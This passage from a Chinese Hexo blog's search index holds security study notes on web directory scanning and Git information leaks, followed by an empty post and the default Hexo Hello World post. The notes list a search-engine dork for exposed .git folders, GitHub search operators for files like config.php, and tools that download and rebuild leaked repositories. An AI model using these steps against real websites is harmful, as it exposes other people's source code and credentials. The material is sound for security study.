class="hljs">一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑https://github.com/H4ckForJob/dirmap</code></pre><p>wfuzz</p><h3 id="8-Git-Hack"><a href="#8-Git-Hack" class="headerlink" title="8. Git Hack"></a>8. Git Hack</h3><h4 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h4><p>Version Control System </p><pre><code class="hljs">是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。版本控制系统不仅可以应用于软件源代码的文本文件，而且可以对任何类型的文件进行版本控制。用的比较多的如svn，git等。</code></pre><p>发展阶段：</p><pre><code class="hljs">版本管理    本地VCS协同开发    文件冲突？                自动合并不冲突的内容        标记冲突的内容    集中化的VCS        Centralized Version Control Systems(CVCS)        代表：            CVS ，SVN去中心化        分布式CVS        Distributed Version Control System(DVCS)                代表：            Github、Gitlab、码云            Git</code></pre><h4 id="为什么Git会导致信息泄露"><a href="#为什么Git会导致信息泄露" class="headerlink" title="为什么Git会导致信息泄露"></a>为什么Git会导致信息泄露</h4><p>把私有仓库&#x2F;隐私文件提交到了github</p><p>部署项目的时候，不小心把 .git 文件一起打包进去，放到web网站的目录下</p><pre><code class="hljs">.git有用的内容        .git/logs/HEAD - 存储了git的log信息，可以找到历史的commit项    .git/index - 缓存git add的文件，暂存区    .git/refs/stash - git stash - 把代码存入缓存区    .git/refs/heads/master - .git/refs/heads/master    .git/objects/pack/.pack</code></pre><h4 id="Github搜索技巧"><a href="#Github搜索技巧" class="headerlink" title="Github搜索技巧"></a>Github搜索技巧</h4><pre><code class="hljs">kali in:file  搜索文件中包含kali的代码kali in:path  搜索路径中包含kali的代码kali in:path,file  搜索路径、文件中包含kali的代码shodan language:python  搜索关键字shodan，语言为python的代码filename:config.php language:php  搜索文件名为config.php， 且语言为phpkali topics:&gt;=5  标签数量大于等于5的kali size:&lt;1000  文件小于1KB的kali stars:10..50  star大于10小于50的kali pushed:&gt;2021-08-15  搜索在2021年8月15日之后提交的kali pushed:2021-07-01..2021-08-01  搜索在此区间kali created:&gt;=2021-06-01  创建时间kali pushed:&lt;2021-08-01 -language:java  搜索在2020年8月1日前push代码且排除java语言</code></pre><h4 id="Git信息泄露利用方式"><a href="#Git信息泄露利用方式" class="headerlink" title="Git信息泄露利用方式"></a>Git信息泄露利用方式</h4><pre><code class="hljs">找到.git     1）目录扫描    2）robots.txt    3）搜索引擎： intitle:&quot;index of /.git&quot;把.git下载到本地    https://github.com/WangYihang/GitHacker用git命令获取内容    git log获取提交记录    git reset --hard [log hash]恢复到某个版本    git diff对比版本差异Git 基本指令的使用https://blog.csdn.net/qtiao/article/details/97783243    git config：配置信息    git add：添加文件到缓存命令    git status：查看文件的状态命令    git diff：查看更新的详细信息命令        尚未缓存的改动：git diff        查看已缓存的改动： git diff --cached        查看已缓存的与未缓存的所有改动：git diff HEAD        显示摘要而非整个 diff：git diff --stat    git commit：提交命令        如果你觉得 每次 commit之前要add一下，想跳过add这一步，可以直接使用 -a选项,如：        git commit -am &quot;第一次版本提交&quot;    git reset HEAD：取消缓存命令    git rm：删除命令    git mv：移动或重命名命令工具    https://github.com/gakki429/Git_Extract</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web安全基础</title>
    <link href="/2023/10/07/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/07/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/06/hello-world/"/>
    <url>/2023/10/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/1.png" alt="1"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
